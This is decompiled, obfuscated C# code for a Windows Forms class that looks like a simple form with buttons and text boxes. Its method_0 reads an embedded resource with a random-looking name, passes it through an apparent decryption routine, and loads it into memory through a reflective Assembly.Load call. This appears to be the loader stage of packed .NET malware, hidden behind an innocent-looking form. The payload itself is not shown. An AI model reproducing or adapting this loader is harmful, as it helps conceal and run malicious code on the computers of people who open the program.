using System;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using ns0;

namespace ns1;

internal class Form1 : Form
{
	private string string_0 = "Xjgaeptwsygp.Lglhkdjmwftfs.dll";

	private IContainer icontainer_0 = null;

	internal Button button_0;

	internal Button button_1;

	internal Button button_2;

	internal TextBox textBox_0;

	internal TextBox textBox_1;

	internal TextBox textBox_2;

	public Form1()
	{
		Class2.smethod_3(this);
		Class2.smethod_6(this);
	}

	internal Assembly method_0(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(string_0);
		byte[] array = new byte[stream.Length];
		stream.Read(array, 0, array.Length);
		byte[] array2 = Class2.smethod_5(array);
		if (array2 == null)
		{
			return null;
		}
		Assembly result = (Assembly)Thread.GetDomain().GetType().InvokeMember("Load", BindingFlags.InvokeMethod, null, AppDomain.CurrentDomain, new object[1] { array2 });
		try
		{
			array = null;
			array2 = null;
		}
		catch
		{
		}
		return result;
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}
}
